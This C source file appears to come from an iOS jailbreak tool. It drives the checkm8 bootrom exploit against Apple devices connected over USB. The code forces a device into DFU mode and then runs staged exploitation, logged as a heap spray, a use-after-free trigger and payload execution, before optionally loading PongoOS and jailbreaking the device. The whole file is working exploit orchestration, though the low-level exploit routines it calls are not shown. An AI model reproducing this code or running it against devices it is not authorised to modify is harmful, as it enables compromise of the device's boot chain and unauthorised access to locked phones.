#include <exploit/exploit.h>

bool stopThreads = false;
extern struct AchillesArgs args;

bool checkm8(enum ExploitMode mode) {
    usb_handle_t *handle = NULL;

    pthread_t normal_thread;
    idevice_t normal_device = NULL;

    pthread_t dfu_thread;
    usb_handle_t dfu_handle;
    init_usb_handle(&dfu_handle, 0x5AC, 0x1227);

    pthread_t recovery_thread;
    usb_handle_t recovery_handle;
    init_usb_handle(&recovery_handle, 0x5AC, 0x1281);

    pthread_t pongo_thread;
    usb_handle_t pongo_handle;
    init_usb_handle(&pongo_handle, 0x5AC, 0x4141);


    if (pthread_create(&normal_thread, NULL, (void *)find_device_in_normal_mode, &normal_device)) {
        LOG(LOG_ERROR, "Failed to create normal thread!");
        return false;
    }
    if (pthread_create(&dfu_thread, NULL, (void *)wait_usb_handle, &dfu_handle)) {
        LOG(LOG_ERROR, "Failed to create DFU thread!");
        return false;
    }
    if (pthread_create(&recovery_thread, NULL, (void *)wait_usb_handle, &recovery_handle)) {
        LOG(LOG_ERROR, "Failed to create recovery thread!");
        return false;
    }
    if (pthread_create(&pongo_thread, NULL, (void *)wait_usb_handle, &pongo_handle)) {
        LOG(LOG_ERROR, "Failed to create PongoOS thread!");
        return false;
    }

    pthread_detach(normal_thread);
    pthread_detach(dfu_thread);
    pthread_detach(recovery_thread);
    pthread_detach(pongo_thread);
    sleep_ms(200);

    if (normal_device) {
        LOG(LOG_INFO, "Found device in normal mode!");
        // This will silently fail if the device is not in normal mode
        if (!place_device_into_recovery_mode(normal_device)) {
            LOG(LOG_ERROR, "Failed to place device into recovery mode!");
            return false;
        }
        normal_device = NULL;
        goto wait_for_recovery;
    } else if (dfu_handle.device) {
        handle = &dfu_handle;
        LOG(LOG_INFO, "Found device in DFU mode!");
    } else if (recovery_handle.device) {
        handle = &recovery_handle;
        LOG(LOG_INFO, "Found device in recovery mode!");
    } else if (pongo_handle.device) {
        handle = &pongo_handle;
    } else {
        LOG(LOG_INFO, "Waiting for device...");
    wait_for_recovery:
        while (true) {
            sleep_ms(200);
            if (normal_device) {
                LOG(LOG_INFO, "Found device in normal mode!");
                // This will silently fail if the device is not in normal mode
                if (!place_device_into_recovery_mode(normal_device)) {
                    LOG(LOG_ERROR, "Failed to place device into recovery mode!");
                    return false;
                }
                normal_device = NULL;
                // Don't break here, we want to wait for the device to enter recovery mode
            } else if (dfu_handle.device) {
                handle = &dfu_handle;
                LOG(LOG_INFO, "Found device in DFU mode!");
                break;
            } else if (recovery_handle.device) {
                handle = &recovery_handle;
                LOG(LOG_INFO, "Found device in recovery mode!");
                break;
            } else if (pongo_handle.device) {
                handle = &pongo_handle;
                break;
            }
        }
    }

    stopThreads = true;
    sleep_ms(200); // Let the threads stop
    stopThreads = false;

    if (handle->pid == 0x1281) {
        if (!get_device_into_dfu_mode(handle)) { return false; }
        handle->pid = 0x1227; // TODO: why is this not done automatically?
        LOG(LOG_INFO, "Device is now in DFU mode!");
    }

    struct DeviceConfiguration deviceConfig;
    struct PayloadConfiguration payloadConfig;
    bool ret = false;
    int stage = STAGE_PREPARE;

    while (stage != STAGE_DONE && wait_usb_handle(handle)) {
        if (stage == STAGE_PREPARE) {
            char *serialNumber = get_usb_device_serial_number(handle);
            if (!serialNumber) { goto finished; }
            if (!checkm8_find_device_configuration_for_cpid(dfu_serial_number_get_cpid(serialNumber), &deviceConfig)) { goto finished; }
            if (!checkm8_find_payload_configuration_for_cpid(dfu_serial_number_get_cpid(serialNumber), &payloadConfig)) { goto finished; }
            if (dfu_serial_number_is_in_yolo_dfu(serialNumber)) { LOG(LOG_INFO, "Found device in Yolo DFU mode!"); stage = STAGE_PONGO; goto yolodfu; }
            if (device_serial_number_is_in_pongo_os(serialNumber) && args.jailbreak) { LOG(LOG_INFO, "Found device in PongoOS!"); stage = STAGE_JAILBREAK; goto pongo; }
            else if (device_serial_number_is_in_pongo_os(serialNumber)) { LOG(LOG_INFO, "Found device in PongoOS!"); return 0; }
            if (dfu_serial_number_is_pwned(serialNumber)) { LOG(LOG_ERROR, "Device is already pwned!"); return true; }
            if (!dfu_serial_number_is_in_dfu_mode(serialNumber)) { LOG(LOG_ERROR, "Device is not in DFU mode!"); return false; }
            free(serialNumber);
            stage = STAGE_RESET;
        }
        if (stage == STAGE_RESET) {
            LOG(LOG_VERBOSE, "Resetting device...");
            ret = checkm8_reset(handle);
            LOG(ret ? LOG_VERBOSE : LOG_ERROR, "Reset %s.", ret ? "succeeded" : "failed");
            stage = STAGE_HEAP_SPRAY;
        }
        else if (stage == STAGE_HEAP_SPRAY) {
            LOG(LOG_INFO, "Stage 1: heap spray");
            ret = checkm8_heap_feng_shui(handle, &deviceConfig);
            LOG(ret ? LOG_VERBOSE : LOG_ERROR, "Heap spray %s.", ret ? "succeeded" : "failed");
            stage = STAGE_TRIGGER;
        }
        else if (stage == STAGE_TRIGGER) {
            LOG(LOG_INFO, "Stage 2: trigger use-after-free");
            ret = checkm8_trigger_UaF(handle, &deviceConfig);
            LOG(ret ? LOG_VERBOSE : LOG_ERROR, "Trigger %s.", ret ? "succeeded" : "failed");
            stage = STAGE_PATCH;
        }
        else if (stage == STAGE_PATCH) {
            LOG(LOG_INFO, "Stage 3: payload execution");
            ret = checkm8_send_overwrite_and_payload(handle, &deviceConfig, &payloadConfig, mode == MODE_PONGOOS);
            LOG(ret ? LOG_VERBOSE : LOG_ERROR, "Patching %s.", ret ? "succeeded" : "failed");
            if (!ret) { goto finished; }
            stage = mode == MODE_PONGOOS && ret ? STAGE_PONGO : STAGE_DONE;
            close_usb_handle(handle);
            if (mode == MODE_PONGOOS) {
                sleep(3);
                LOG(LOG_INFO, "If your device is stuck on the Apple logo, please unplug and replug.");
                ret = wait_for_device_to_enter_yolo_dfu(handle);
                stage = ret ? STAGE_PONGO : STAGE_DONE;
            }
        }
        else if (stage == STAGE_PONGO) {
        yolodfu:
            LOG(LOG_INFO, "Sending PongoOS...");
            ret = send_pongo_to_yolo_dfu(handle);
            stage = (ret && args.jailbreak) ? STAGE_JAILBREAK : STAGE_DONE;
            if (stage == STAGE_DONE) { goto finished; }
        }
        else if (stage == STAGE_JAILBREAK) {
        pongo:
            LOG(LOG_INFO, "Jailbreaking...");
            ret = pongo_jailbreak(handle);
            goto finished;
        }

        if (stage != STAGE_JAILBREAK && stage != STAGE_DONE && stage != STAGE_PONGO) { reset_usb_handle(handle); }

        // If a stage fails, and it's not the reset stage, we should stop
        if (!ret && stage != STAGE_HEAP_SPRAY) { goto finished; }
    }
finished:
    if (ret) {
        LOG(LOG_SUCCESS, "%s succeeded.", mode == MODE_PONGOOS ? "Booting PongoOS" : "Exploit");
    } else {
        LOG(LOG_ERROR, "Exploit failed at stage %d!", stage == STAGE_PREPARE ? stage : stage - 1);
    }
    return ret;
}